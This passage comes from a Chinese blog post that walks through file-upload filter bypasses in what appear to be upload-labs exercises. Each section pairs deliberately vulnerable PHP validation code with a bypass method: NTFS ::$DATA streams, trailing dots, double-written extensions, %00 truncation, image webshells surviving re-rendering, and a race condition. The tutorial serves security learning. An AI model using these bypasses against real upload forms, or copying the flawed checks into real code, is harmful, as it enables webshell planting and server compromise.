class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p> 绕过原理：</p><ul><li>程序没有对后缀名进行去”.”处理，利用windows特性，会自动去掉后缀名中最后的”.”，</li></ul><p>绕过方法：</p><ul><li>可在后缀名中加”.”绕过</li></ul><h2 id="文件上传——NTFS-ADS-文件流绕过检测"><a href="#文件上传——NTFS-ADS-文件流绕过检测" class="headerlink" title="文件上传——NTFS ADS 文件流绕过检测"></a>文件上传——NTFS ADS 文件流绕过检测</h2><ul><li>后端代码</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>绕过原理：</p><ul><li>程序没有对后缀名进行去”::$DATA”处理 ，如果上传的文件名字为：test.php::$DATA，会在服务器上生成一个test.php的文件，其中内容和所上传文件内容相同，并被解析 </li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">上传 Test.php:a.jpg     生成Test.php  文件内容为空</span><br><span class="line"></span><br><span class="line">上传 Test.php::$DATA  生成test.php  文件内容为&lt;?php phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">上传 Test.php::$INDEX_ALLOCATION  生成test.php文件夹</span><br><span class="line"></span><br><span class="line">上传 Test.php::$DATA\0.jpg  生成0.jpg  文件内容为&lt;?php phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">上传 Test.php::$DATA\aaa.jpg  生成aaa.jpg  文件内容为&lt;?php phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">PS: 上传test.php:a.jpg的时候其实是在服务器上正常生成了一个数据流文件，可以通过notepad test.php:a.jpg查看内容，而test.php为空也是正常的。</span><br></pre></td></tr></table></figure><p>绕过方法：</p><ul><li>上传文件后缀加 ::$DATA</li></ul><h2 id="文件上传——文件名加-绕过"><a href="#文件上传——文件名加-绕过" class="headerlink" title="文件上传——文件名加. .绕过"></a>文件上传——文件名加. .绕过</h2><p>后端代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>绕过原理：</p><ul><li>程序没有匹配完全 只删除文件名末尾的 .  </li></ul><p>绕过方法：</p><ul><li>上传文件后缀加. .</li></ul><h2 id="文件上传——文件名双写绕过"><a href="#文件上传——文件名双写绕过" class="headerlink" title="文件上传——文件名双写绕过"></a>文件上传——文件名双写绕过</h2><ul><li>后端代码</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>绕过原理：</p><ul><li>程序仅仅对黑名单内的后缀名进行字符替换，且没有预处理只替换一次</li></ul><p>绕过方法：</p><ul><li>上传文件的文件后缀名双写可进行绕过检测</li></ul><h2 id="文件上传——-00截断绕过-GET"><a href="#文件上传——-00截断绕过-GET" class="headerlink" title="文件上传——%00截断绕过(GET)"></a>文件上传——%00截断绕过(GET)</h2><ul><li>后端代码</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>绕过原理：</p><ul><li>程序使用白名单限制，通过拼接路径和文件名来进行存储 且 拼接的路径和文件名均可变</li></ul><p>绕过方法：</p><ul><li>路径处进行%00截断绕过</li></ul><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%E6%80%BB%E7%BB%93/00截断绕过/1.gif" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="文件上传——-00截断绕过-POST"><a href="#文件上传——-00截断绕过-POST" class="headerlink" title="文件上传——%00截断绕过(POST)"></a>文件上传——%00截断绕过(POST)</h2><ul><li>后端代码</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_POST[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传失败"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>绕过原理：</p><ul><li>大部分跟上面的相似，但POST传输的数据（%00）不可以自动解析进行截断</li></ul><p>绕过方法：</p><ul><li>burp自带hex编码，将php后面的一组数改为00</li></ul><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%E6%80%BB%E7%BB%93/00截断绕过/2.gif" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="文件上传——简单的上传图片马进行绕过（利用文件包含漏洞）"><a href="#文件上传——简单的上传图片马进行绕过（利用文件包含漏洞）" class="headerlink" title="文件上传——简单的上传图片马进行绕过（利用文件包含漏洞）"></a>文件上传——简单的上传图片马进行绕过（利用文件包含漏洞）</h2><ul><li>后端代码：</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">"rb"</span>);</span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">"C2chars"</span>, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">'chars1'</span>].$strInfo[<span class="string">'chars2'</span>]);    </span><br><span class="line">    $fileType = <span class="string">''</span>;    </span><br><span class="line">    <span class="keyword">switch</span>($typeCode)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            $fileType = <span class="string">'jpg'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            $fileType = <span class="string">'png'</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            $fileType = <span class="string">'gif'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            $fileType = <span class="string">'unknown'</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($file_type == <span class="string">'unknown'</span>)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_type;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>绕过原理：</p><ul><li>文件包含漏洞在加载文件时统一解析为该服务器所处理的脚本文件</li></ul><p>绕过方法：</p><ul><li>http://*.*.*.*/upload.php?file=xiaoma.jpg (访问上传的小马文件即可，相对路径)</li></ul><h2 id="文件上传——二次渲染绕过（利用文件包含漏洞）"><a href="#文件上传——二次渲染绕过（利用文件包含漏洞）" class="headerlink" title="文件上传——二次渲染绕过（利用文件包含漏洞）"></a>文件上传——二次渲染绕过（利用文件包含漏洞）</h2><ul><li>后端代码</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'../config.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'../head.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'../menu.php'</span>;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    $filename = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $filetype = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>];</span><br><span class="line">    $tmpname = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line"></span><br><span class="line">    $target_path=UPLOAD_PATH.<span class="string">'/'</span>.basename($filename);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    $fileext= substr(strrchr($filename,<span class="string">"."</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>(($fileext == <span class="string">"jpg"</span>) &amp;&amp; ($filetype==<span class="string">"image/jpeg"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是jpg格式的图片！"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".jpg"</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</span><br><span class="line">                imagejpeg($im,$img_path);</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"png"</span>) &amp;&amp; ($filetype==<span class="string">"image/png"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefrompng($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是png格式的图片！"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".png"</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</span><br><span class="line">                imagepng($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"gif"</span>) &amp;&amp; ($filetype==<span class="string">"image/gif"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefromgif($target_path);</span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是gif格式的图片！"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".gif"</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</span><br><span class="line">                imagegif($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传后缀为.jpg|.png|.gif的图片文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>绕过原理：</p><ul><li>源文件与上传文件虽然会进行二次渲染，但分析后呢 两个文件仍会有相同的16进制编码部分</li></ul><p>绕过方法：</p><ul><li>生成一个普通的gif文件（文件尽量大一些容易找到相同编码的部分）</li><li>将最初的图片文件命名为test.gif 上传后的图片命名为test2.gif</li><li>利用010Editor将两图片进行比较，找到相同的部分</li><li><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%E6%80%BB%E7%BB%93/二次渲染/1.gif" alt title>                </div>                <div class="image-caption"></div>            </figure></li><li>在蓝色部分随便挑选一个位置写入 <?php phpinfo();?></li><li><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%E6%80%BB%E7%BB%93/二次渲染/2.gif" alt title>                </div>                <div class="image-caption"></div>            </figure></li><li>上传修改文件后利用文件包含漏洞进行访问</li><li><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/11/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%E6%80%BB%E7%BB%93/二次渲染/3.gif" alt title>                </div>                <div class="image-caption"></div>            </figure></li></ul><h2 id="文件上传——条件竞争绕过"><a href="#文件上传——条件竞争绕过" class="headerlink" title="文件上传——条件竞争绕过"></a>文件上传——条件竞争绕过</h2><ul><li>后端代码</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    $upload_file = UPLOAD_PATH . <span class="string">'/'</span> . $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = UPLOAD_PATH . <span class="string">'/'</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>绕过原理：</p><ul><li>这里先将文件上传到服务器，然后通过rename修改名称，再通过unlink删除文件，因此可以通过条件竞争的方式在unlink之前，访问webshell。 </li></ul><p>绕过方法:</p><ul><li>利用burp抓到上传文件的数据包进行循环发送</li><li><figure 